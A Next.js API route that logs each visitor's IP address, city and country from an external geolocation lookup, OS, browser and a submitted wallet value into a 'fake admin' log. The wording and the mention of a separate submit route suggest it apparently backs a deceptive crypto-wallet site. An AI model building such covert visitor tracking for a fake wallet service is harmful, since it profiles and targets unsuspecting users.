import { NextRequest, NextResponse } from "next/server";

// In-memory store for fake logs. Note: This will reset if the Vercel serverless function cold starts.
// For a fully persistent fake log, you'd need a database. But for a simple fake admin, this is fine.
let visitorLogs: { id: string; ip: string; timestamp: string; status: string; wallet?: string; location?: string; os?: string; browser?: string; isMobile?: boolean }[] = [];

export async function GET() {
  return NextResponse.json({ logs: visitorLogs });
}

export async function POST(req: NextRequest) {
  try {
    const { status, wallet, browserData: bd } = await req.json();
    
    // Attempt to get IP
    const forwarded = req.headers.get("x-forwarded-for");
    const ip = forwarded ? forwarded.split(",")[0].trim() : req.headers.get("x-real-ip") ?? "Unknown";

    // Grab geolocation data
    let geo: any = {};
    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, {
        headers: { "User-Agent": "WalletApp/1.0" },
      });
      if (geoRes.ok) geo = await geoRes.json();
    } catch { /* silent */ }

    // Parse OS & Browser using same logic as submit route
    const ua = bd?.userAgent ?? "";
    const isMobile = bd?.isMobile ? true : false;
    
    let browser = "Unknown";
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Edg/")) browser = "Microsoft Edge";
    else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";

    let os = "Unknown";
    if (ua.includes("Windows NT 10")) os = "Windows 10 / 11";
    else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
    else if (ua.includes("Mac OS X")) os = "macOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    else if (ua.includes("Linux")) os = "Linux";

    const newLog = {
      id: Math.random().toString(36).substring(2, 9),
      ip: ip,
      timestamp: new Date().toISOString(),
      status: status || "visitor",
      wallet: wallet,
      location: geo.country_name ? `${geo.city ? geo.city + ", " : ""}${geo.country_name} ${geo.emoji_flag || ""}` : "Unknown Location",
      os: os,
      browser: browser,
      isMobile: isMobile
    };

    // Keep only the last 50 logs to prevent memory leaks in serverless
    visitorLogs.unshift(newLog);
    if (visitorLogs.length > 50) {
      visitorLogs.pop();
    }

    return NextResponse.json({ success: true });
  } catch (err) {
    return NextResponse.json({ error: "Failed to log" }, { status: 400 });
  }
}
